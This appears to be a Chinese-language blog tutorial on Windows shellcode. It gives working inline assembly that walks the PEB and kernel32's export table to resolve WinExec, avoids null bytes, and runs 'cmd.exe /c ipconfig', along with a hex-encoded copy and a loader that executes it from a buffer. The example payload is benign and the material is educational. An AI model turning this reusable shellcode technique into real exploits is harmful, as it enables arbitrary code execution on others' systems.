## Windows平台下shellcode的编写

2019-5-30

因为Windows没有Linux系统的系统调用的机制，不能直接通过系统中断来调用函数。

需要先获取到要调用的函数在内存中的地址，然后再去调用函数。

### 硬编码

在同一个系统上，没有开启ASLR的时候，库中函数的地址是不变的，所以可以先把要用的函数的地址找到，然后编写shellcode时硬编码。编写起来较为简单



### 利用PEB结构编写平台无关的shellcode

当系统开启ASLR后，或者系统不同，那么函数的地址就不是固定的了。

不过仍可通过一定手段，获取到要调用的函数所在的动态链接库在内存中加载的基地址，然后根据PE结构和动态链接库的结构，来获取到函数的地址

参考自 <https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html>

```c
// portable_winshellcode.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>


void winexec()
{
	__asm
	{
	start:
		push ebp;
		mov ebp, esp;
		sub esp, 0x40;

		xor eax, eax;
		/*push eax;        //字符串终止*/
		push 0xFF636578;   //xec的倒序ASCII码，为了防止产生00字节，用FF填充。因为后面比较字符串的时候设定了比较的长度，所以没有标识字符串终止的0不影响运行
		push 0x456e6957; // WinE的倒序ASCII码 
		mov[ebp - 0x4], esp; //将字符串指针保存到ebp-0x4

		//获取kernel32的基址，存到ebp-0x8
		mov ebx, fs : [eax+0x30];//防止产生00字节
		mov ebx, [ebx + 0xc];
		mov ebx, [ebx + 0x14];
		mov ebx, [ebx];         
		mov ebx, [ebx];          //原先使用的是eax，会产生00字节
		mov ebx, [ebx + 0x10];
		mov [ebp - 0x8], ebx;
		mov eax, ebx;

		//PE signature的RVA（相对虚拟地址）存储在模块基址+0x3c的地方
		mov ebx, [eax + 0x3c];
		//PE signature的内存地址 = 模块基址 + RVA
		add ebx, eax;

		//PE signature地址向后偏移0x78个字节为导出表的RVA
		mov ebx, [ebx + 0x78];
		//导出函数表的内存地址 = 基地址 + 导出函数表的RVA，将地址存储到ebp-0xc处
		add ebx, eax;
		mov [ebp - 0xc], ebx;

		//导出函数的数量存储在导出表+0x14字节的位置。保存到ebp-0x10
		mov ecx, [ebp - 0xc];
		add ecx, 0x14;
		mov ecx, [ecx];
		mov [ebp - 0x10], ecx;

		//函数名称字符串指针表的RVA存储在导出表+0x20字节的位置
		mov edx, [ebx + 0x20];
		//Name pointer table 在内存中的地址 = 基地址 + RVA ，存储到ebp - 0x14
		add edx, eax;
		mov[ebp - 0x14], edx;

		//将eax用于计数，初始化eax
		xor eax, eax;
		//此时栈上的数据：
		//ebp - 0x4 -> WinExec字符串指针
		//    - 0x8 -> kernel32基地址
		//    - 0xc -> 函数导出表的内存地址
		//    - 0x10-> 函数的数量
		//    - 0x14-> 函数名称字符串指针表的内存地址
	resolve:
		//循环遍历名称表，计算出用到的函数的索引
		cld; //置DF=0，让字符串从左到右处理
		mov ebx, [ebp - 0x8];   //取出基址
		mov ecx, [ebp - 0x14];  //取出字符串指针表的内存地址
		mov ecx, [ecx + eax*4]  //取出当前要判断的函数名的指针的RVA
		add ebx, ecx;         //算出内存地址

		xor ecx, ecx;
		add cx, 7;    //设置要判断的长度为7 "WinExec"
		//进行判断
		mov esi, [ebp - 0x4];
		mov edi, ebx;
		repe cmpsb;   //将edi 和 esi指向的字符串进行比较，相同则ZF=1，否则ZF=0
		je execute;   //如果找到函数则跳到execute，执行函数

		inc eax;
		cmp eax, [ebp - 0x10];
		jb resolve; //如果没有遍历完则继续遍历

		jmp end;    //如果没有可遍历的项，则退出

	execute:
		//序列表（Ordinal Table）的RVA = [导出表+0x24]
		mov ebx, [ebp - 0xc];
		mov ebx, [ebx + 0x24];

		//计算根据索引序列表的内存地址
		add ebx, [ebp - 0x8];
		
		//取出函数序列号, 序列号为2字节
		xor ecx, ecx;
		mov cx, [ebx + eax * 2];

		//地址表的RVA = [导出表+0x1c]
		mov eax, [ebp - 0xc];
		mov eax, [eax + 0x1c];
		//计算地址表的内存地址
		add eax, [ebp - 0x8];
		//获取函数的RVA = [地址表 + 函数序列号*4]
		mov eax, [eax + ecx * 4];

		//计算函数的内存地址
		add eax, [ebp - 0x8];


		xor ebx, ebx;
		push ebx;
		/*
		push 0x6578652e; //.exe的倒序ASCII
		push 0x636c6163; // calc的倒序ASCII
		*/

		// cmd.exe /c ipconfig 
		push 0x20676966;
		push 0x6e6f6370;
		push 0x6920632f;
		push 0x20657865;
		push 0x2e646d63;

		mov ecx, esp;    
		add bx, 1;       
		
		//调用函数
		push ebx; // SW_SHOWNORMAL == 1
		push ecx; // 字符串
		call eax;

	end:
		add esp, 0x40;
		pop ebp;
		ret
	}
}

int main()
{
	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");

	printf("kernel32.dll base: 0x%X\n", kernel32);
	printf("function address : 0x%p\n", &winexec);

	winexec();
    return 0;
}


```



测试

```c
#include "stdafx.h"
#include "windows.h"

unsigned char buf[] = "\x55\x8B\xEC\x83\xEC\x40\x33\xC0\x68\x78\x65\x63\xFF\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x58\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\xC3\x8B\x58\x3C\x03\xD8\x8B\x5B\x78\x03\xD8\x89\x5D\xF4\x8B\x4D\xF4\x83\xC1\x14\x8B\x09\x89\x4D\xF0\x8B\x53\x20\x03\xD0\x89\x55\xEC\x33\xC0\xFC\x8B\x5D\xF8\x8B\x4D\xEC\x8B\x0C\x81\x03\xD9\x33\xC9\x66\x83\xC1\x07\x8B\x75\xFC\x8B\xFB\xF3\xA6\x74\x08\x40\x3B\x45\xF0\x72\xDF\xEB\x44\x8B\x5D\xF4\x8B\x5B\x24\x03\x5D\xF8\x33\xC9\x66\x8B\x0C\x43\x8B\x45\xF4\x8B\x40\x1C\x03\x45\xF8\x8B\x04\x88\x03\x45\xF8\x33\xDB\x53\x68\x66\x69\x67\x20\x68\x70\x63\x6F\x6E\x68\x2F\x63\x20\x69\x68\x65\x78\x65\x20\x68\x63\x6D\x64\x2E\x8B\xCC\x66\x83\xC3\x01\x53\x51\xFF\xD0\x83\xC4\x40\x5D\xC3";

int main(int argc, char* argv[])
{
	typedef void(__stdcall *exe)();
	exe shellcode = (exe)&buf;

	shellcode();
	return 0;
}
```

